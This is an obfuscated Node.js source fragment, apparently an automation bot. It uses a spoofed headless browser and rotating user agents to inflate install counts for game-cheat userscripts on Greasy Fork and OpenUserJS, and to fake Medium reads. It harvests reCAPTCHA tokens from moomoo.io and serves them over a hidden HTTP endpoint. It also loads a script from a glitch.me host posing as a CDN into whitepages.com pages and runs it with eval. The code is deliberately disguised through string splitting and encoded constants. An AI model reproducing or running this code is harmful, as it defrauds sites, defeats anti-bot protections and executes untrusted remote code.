      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + Y(0x15) + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + W(0x6, 'D7uu') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + Y(0x17) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + Y(0x4) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + W(0x18, 'MRQ8') + W(0x2, '8yc]') + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + V(0x0) + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xa49 * -0x1 + 0x38 * -0x4f + 0x6ff
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x24ed + -0x2502 + 0x3 * 0x7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xf7f * -0x1 + 0x1926 + 0x1 * -0x943), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x95c + -0x143d * -0x1 + -0xa7d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0x223 + 0x269f + -0x28c2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x16c3 * 0x1 + 0x1e57 * 0x1 + -0x2 * 0x1a8d; w < getRandomInt(0x17f * 0x10 + -0x1330 + 0x87 * -0x9, -0x213b * -0x1 + 0xc55 + -0x2d8b * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1a03 * 0x5 + 0x35e7 * 0x1 + 0x1935 * 0x2);
        }
      }();
    }, 0x6f * -0x3a + 0x251c + -0x2 * 0x5c9), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x322 + -0x17 * -0x55 + 0x481 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x7 * -0x49 + -0x3ad + 0x2c * 0x21, 0x6c2 * -0x5 + 0x1c * -0x121 + 0x4198)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x5cf + 0x4514 * 0x1 + 0x35eb);
    }, 0x2304 + -0x78d * 0x3 + 0x5 * -0x265), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Z = b;
        try {
          let s = -0x55e * -0x6 + 0x1575 * -0x1 + -0x1 * 0xabf;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u[Z(0x11, 'D7uu')](), await t['close'](), r();
          await wait(0x21ea + 0x266f + -0x3ca1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1d3e + 0x25 * -0x18 + 0x20b6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x19 * 0x2b61 + 0x128c58 + -0x245 * 0x3fd);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x93 * -0x31 + 0x1 * 0x2437 + 0x7b0 * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a0 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * 0x473 + 0x6e1 + -0x9 * 0x12c);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + a0(0x1b) + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1 * 0x6e5 + -0x1f * -0x6f + 0x1904);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1754 + -0xe5 * -0x4 + 0x185 * 0xd) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x13e + 0x99f + -0xadc));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x17ae + -0x1a5 * 0x1 + -0x1609 * 0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0xadb + 0x1988 + -0xead, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xb8e + -0x254 * 0x3 + 0x2 * 0x113f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)[a1(0x9)](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4185 + -0x4d01 + 0x328c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + a2(0x8, 'jd92') + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
